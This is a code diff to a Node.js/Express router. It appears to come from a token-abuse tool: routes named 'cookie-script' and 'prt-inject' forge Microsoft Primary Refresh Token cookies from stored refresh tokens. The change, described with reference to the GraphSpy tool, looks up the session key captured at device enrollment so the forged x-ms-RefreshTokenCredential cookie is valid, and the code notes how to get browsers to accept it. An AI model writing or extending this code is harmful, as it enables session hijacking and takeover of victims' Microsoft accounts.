@@ -321,14 +321,20 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
             }
           } catch (e) { /* ignore */ }
         }
-        // Log if uid is missing (will fall back to base64 format instead of PRT JWT)
-        if (!uid) {
-          console.warn('[Tokens] uid not found - PRT JWT generation will use base64 fallback');
+        // GraphSpy's PRT cookie needs the session key captured at device
+        // enrollment - without it there is no valid cookie to build.
+        let prtSessionKey = null;
+        try {
+          const deviceManager = require('../services/devicemanager');
+          const stored = await deviceManager.getStoredSessionKey(token.user_id, tid);
+          if (stored && stored.hasSessionKey) prtSessionKey = stored.sessionKey;
+        } catch (skErr) {
+          console.warn('[Tokens] PRT session key lookup failed:', skErr.message);
         }
-        const prtCookieObj = cookieConverter.generateXmsRefreshTokenCredential(
+        const prtCookieObj = await cookieConverter.generateXmsRefreshTokenCredential(
         refreshToken,
         accountType,
-        { tid: tid, uid: uid, scopes: 'openid profile email offline_access' }
+        { tid: tid, uid: uid, scopes: 'openid profile email offline_access', sessionKey: prtSessionKey }
       );
         if (prtCookieObj && prtCookieObj.value) {
           // IMPORTANT: Do NOT include domain attribute - browsers block third-party cookies
@@ -1177,12 +1183,21 @@ router.get('/prt-inject', userAuth, async (req, res) => {
       } catch (e) { /* ignore */ }
     }
 
-    // Generate PRT cookie using cookie converter
+    // Generate PRT cookie using cookie converter. GraphSpy's KDF method needs
+    // the session key captured at device enrollment.
     const cookieConverter = require('../services/cookieconverter');
-    const prtCookieObj = cookieConverter.generateXmsRefreshTokenCredential(
+    let prtSessionKey = null;
+    try {
+      const deviceManager = require('../services/devicemanager');
+      const stored = await deviceManager.getStoredSessionKey(token.user_id, tid);
+      if (stored && stored.hasSessionKey) prtSessionKey = stored.sessionKey;
+    } catch (skErr) {
+      console.warn('[Tokens] PRT session key lookup failed:', skErr.message);
+    }
+    const prtCookieObj = await cookieConverter.generateXmsRefreshTokenCredential(
       refreshToken,
       token.account_type || 'work_school',
-            { tid: tid, uid: uid, scopes: 'openid profile email offline_access' }
+            { tid: tid, uid: uid, scopes: 'openid profile email offline_access', sessionKey: prtSessionKey }
     );
 
     if (!prtCookieObj || !prtCookieObj.value) {
